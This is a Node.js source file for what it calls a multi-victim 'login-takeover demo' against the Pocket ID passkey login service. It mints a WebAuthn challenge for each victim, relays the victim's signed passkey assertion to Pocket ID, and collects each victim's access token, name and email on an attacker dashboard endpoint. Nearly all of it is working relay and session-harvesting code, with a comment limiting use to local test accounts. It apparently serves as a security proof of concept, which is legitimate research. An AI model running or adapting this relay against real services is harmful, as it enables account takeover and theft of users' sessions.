// Lean login-takeover demo over Pocket ID (passkey OIDC), multi-victim.
//
// This app owns the public origin http://localhost:1411 and reverse-proxies /api/*
// (and anything it does not serve) to Pocket ID on 127.0.0.1:1412, so the passkey
// ceremony happens on the origin Pocket ID expects (APP_URL=http://localhost:1411).
//
// The login relay runs server-side here (the "attacker backend"), so it can hold a
// separate Pocket ID session per victim and bank every captured session:
//   GET  /x/stage        -> server calls login/start, mints a per-victim challenge
//   POST /x/drop         -> server calls login/finish with that slot's cookie, banks the session
//   GET  /x/sessions     -> the attacker dashboard polls this (name, email, token expiry)
//   POST /x/reset        -> clear banked sessions
//
// Authorized demo use only: your own local Pocket ID + disposable test users.
import http from 'node:http';
import { readFile } from 'node:fs/promises';
import { randomUUID } from 'node:crypto';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const PORT = Number(process.env.PORT || 1411);
const PID = { host: '127.0.0.1', port: Number(process.env.PID_PORT || 1412) };
const __dirname = path.dirname(fileURLToPath(import.meta.url));

const slots = new Map();    // slotId -> { challenge, rpId, cookie, at }  (pending, 60s)
const sessions = new Map(); // id -> { id, name, email, userId, token, exp, at } (banked)

const json = (res, code, body) => { res.writeHead(code, { 'content-type': 'application/json', 'cache-control': 'no-store' }); res.end(JSON.stringify(body)); };
const readBody = (req) => new Promise((r) => { let d = ''; req.on('data', (c) => (d += c)); req.on('end', () => r(d)); });
async function serveFile(res, file) {
  try { const html = await readFile(path.join(__dirname, 'public', file)); res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' }); res.end(html); }
  catch { json(res, 404, { error: 'not found' }); }
}

// Reverse proxy to Pocket ID (used by the victim's browser for enrollment: /api/signup
// /setup, /api/webauthn/register/*). The attack relay below talks to Pocket ID directly.
function proxy(req, res) {
  // Forward the browser's real Host (tunnel hostname when tunneled) and cloudflared's
  // X-Forwarded-Proto, so Pocket ID (TRUST_PROXY) sees the correct public origin.
  const headers = { ...req.headers };
  const p = http.request({ host: PID.host, port: PID.port, method: req.method, path: req.url, headers }, (pr) => { res.writeHead(pr.statusCode, pr.headers); pr.pipe(res); });
  p.on('error', () => json(res, 502, { error: 'pocket-id unreachable' }));
  req.pipe(p);
}

// Server-side call to Pocket ID.
function pid(method, pathname, { body, cookie } = {}) {
  return new Promise((resolve, reject) => {
    const data = body ? Buffer.from(JSON.stringify(body)) : null;
    const headers = { accept: 'application/json', host: `localhost:${PORT}` };
    if (data) { headers['content-type'] = 'application/json'; headers['content-length'] = data.length; }
    if (cookie) headers.cookie = cookie;
    const r = http.request({ host: PID.host, port: PID.port, method, path: pathname, headers }, (pr) => {
      const chunks = []; pr.on('data', (c) => chunks.push(c)); pr.on('end', () => resolve({ status: pr.statusCode, headers: pr.headers, body: Buffer.concat(chunks).toString() }));
    });
    r.on('error', reject); if (data) r.write(data); r.end();
  });
}
// Pocket ID uses bare names on http (session, access_token) and the secure __Host-
// prefix on https (__Host-session, __Host-access_token). Match either, keep the name.
const cookieVal = (setCookie, base) => { for (const sc of setCookie || []) { const m = new RegExp('(?:^|, )((?:__Host-|__Secure-)?' + base + ')=([^;]+)').exec(sc); if (m) return m[1] + '=' + m[2]; } return null; };
const jwtExp = (t) => { try { return JSON.parse(Buffer.from(t.split('.')[1].replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString()).exp; } catch { return Math.floor(Date.now() / 1000) + 3600; } };
const pruneSlots = () => { const cut = Date.now() - 70000; for (const [k, v] of slots) if (v.at < cut) slots.delete(k); };

const server = http.createServer(async (req, res) => {
  const pth = new URL(req.url, 'http://localhost').pathname;

  // Victim asks for a challenge: mint a fresh Pocket ID login challenge for THIS victim.
  if (pth === '/x/stage' && req.method === 'GET') {
    pruneSlots();
    try {
      const r = await pid('GET', '/api/webauthn/login/start');
      const opts = JSON.parse(r.body);
      const cookie = cookieVal(r.headers['set-cookie'], 'session');
      const slotId = randomUUID();
      slots.set(slotId, { challenge: opts.challenge, rpId: opts.rpId || 'localhost', cookie, at: Date.now() });
      return json(res, 200, { slotId, challenge: opts.challenge, rpId: opts.rpId || 'localhost' });
    } catch (e) { return json(res, 502, { error: 'stage failed: ' + e.message }); }
  }

  // Victim drops a signed assertion: complete the login server-side and bank the session.
  if (pth === '/x/drop' && req.method === 'POST') {
    const b = JSON.parse((await readBody(req)) || '{}');
    const slot = slots.get(b.slotId);
    if (!slot || !b.assertion) return json(res, 400, { error: 'unknown slot or no assertion' });
    try {
      const fin = await pid('POST', '/api/webauthn/login/finish', { body: b.assertion, cookie: slot.cookie });
      slots.delete(b.slotId);
      if (fin.status !== 200) return json(res, 200, { ok: false, error: 'login/finish ' + fin.status });
      // The finish response IS the user object, and its Set-Cookie carries the token.
      // So completing the login hands the attacker both the identity and the token in one
      // step. No extra query needed.
      const access = cookieVal(fin.headers['set-cookie'], 'access_token');
      const token = access.slice(access.indexOf('=') + 1);
      let u = {}; try { u = JSON.parse(fin.body); } catch {}
      const id = randomUUID();
      const name = u.displayName || `${u.firstName || ''} ${u.lastName || ''}`.trim() || u.username || 'unknown';
      sessions.set(id, { id, name, email: u.email || '', userId: u.id, token, exp: jwtExp(token), at: Date.now() });
      return json(res, 200, { ok: true, id });
    } catch (e) { return json(res, 502, { ok: false, error: e.message }); }
  }

  if (pth === '/x/sessions' && req.method === 'GET') {
    // The attacker's loot: each captured session, with the identity and token that the
    // login/finish response handed over.
    const list = [...sessions.values()].sort((a, b) => b.at - a.at)
      .map((s) => ({ id: s.id, name: s.name, email: s.email, userId: s.userId, exp: s.exp, at: s.at, token: s.token }));
    return json(res, 200, { now: Math.floor(Date.now() / 1000), sessions: list });
  }
  if (pth === '/x/reset' && req.method === 'POST') { sessions.clear(); slots.clear(); return json(res, 200, { ok: true }); }

  // our pages
  if (pth === '/') { res.writeHead(302, { location: '/login' }); return res.end(); }
  if (pth === '/login') return serveFile(res, 'login.html');
  if (pth === '/attacker') return serveFile(res, 'attacker.html');

  // everything else: proxy to Pocket ID (enrollment API + assets)
  return proxy(req, res);
});

server.listen(PORT, () => console.log(`login-takeover demo on http://localhost:${PORT}  (/api -> Pocket ID ${PID.host}:${PID.port})`));
